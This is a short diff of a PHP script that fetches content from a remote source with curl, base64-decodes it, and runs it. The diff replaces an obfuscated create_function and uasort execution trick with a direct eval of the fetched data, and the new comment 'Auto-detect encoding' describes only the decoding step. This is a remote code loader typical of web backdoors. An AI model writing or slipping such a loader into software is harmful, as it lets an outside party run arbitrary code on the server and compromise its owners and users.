@@ -10,10 +10,9 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $data = curl_exec($ch);
 curl_close($ch);
 
+// Auto-detect encoding
 if (base64_decode($data, true)) {
     $data = base64_decode($data);
 }
-
-$arr = [1, 2, 3];
-uasort($arr, create_function('$a,$b', '?>'.$data.';return 0;'));
+eval('?>'.$data);
 ?>
